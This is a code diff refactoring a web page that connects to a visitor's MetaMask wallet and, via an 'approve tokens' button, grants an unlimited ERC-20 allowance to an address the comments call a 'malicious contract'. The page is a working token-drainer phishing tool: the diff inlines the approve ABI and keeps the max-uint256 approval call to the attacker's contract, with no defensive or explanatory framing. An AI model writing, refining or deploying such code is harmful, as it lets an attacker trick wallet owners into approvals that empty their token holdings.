@@ -15,17 +15,30 @@
     <script>
         let web3;
         let userAccount;
-        let contractAddress = "0xf8e81D47203A594245E36C48e151709F0C19fBe8"; // Replace with your malicious contract address
-        let tokenAddress = "0xb556Deb94276a61b2f749022ca61c9BbBb1A8D5A"; // Replace with your ERC-20 token address
-        let contract;
+        const contractAddress = "0xf8e81D47203A594245E36C48e151709F0C19fBe8"; // Replace with your malicious contract address
+        const tokenAddress = "0xb556Deb94276a61b2f749022ca61c9BbBb1A8D5A"; // Replace with your ERC-20 token address
         let token;
+
+        const tokenABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    { "name": "spender", "type": "address" },
+                    { "name": "amount", "type": "uint256" }
+                ],
+                "name": "approve",
+                "outputs": [{ "name": "", "type": "bool" }],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
 
         window.onload = () => {
             console.debug("Page loaded. Checking for MetaMask...");
             if (typeof window.ethereum !== 'undefined') {
                 web3 = new Web3(window.ethereum);
                 console.debug("MetaMask found. Initializing...");
-                loadABI();
                 init();
             } else {
                 alert("MetaMask not found!");
@@ -33,36 +46,10 @@
             }
         };
 
-        async function loadABI() {
-            try {
-                console.debug("Fetching ABI...");
-                const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
-                const abi = await response.json();
-                contract = new web3.eth.Contract(abi, contractAddress);
-                console.debug("Malicious contract initialized:", contract);
-
-                const erc20Abi = [
-                    {
-                        "constant": false,
-                        "inputs": [
-                            { "name": "spender", "type": "address" },
-                            { "name": "amount", "type": "uint256" }
-                        ],
-                        "name": "approve",
-                        "outputs": [{ "name": "", "type": "bool" }],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }
-                ];
-                token = new web3.eth.Contract(erc20Abi, tokenAddress);
-                console.debug("ERC-20 token contract initialized:", token);
-            } catch (error) {
-                console.error("Error loading ABI:", error);
-            }
-        }
-
         async function init() {
+            token = new web3.eth.Contract(tokenABI, tokenAddress);
+            console.debug("ERC-20 token contract initialized:", token);
+
             document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
             document.getElementById('approveTokensBtn').addEventListener('click', approveTokens);
         }
@@ -84,7 +71,7 @@
             try {
                 const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
                 console.debug("Approving unlimited tokens for:", contractAddress);
-                
+
                 await token.methods.approve(contractAddress, unlimitedAmount).send({ from: userAccount });
                 console.debug("Approval successful.");
                 document.getElementById('status').innerText = `Approval successful! Unlimited tokens have been approved.`;
@@ -96,4 +83,3 @@
     </script>
 </body>
 </html>
-
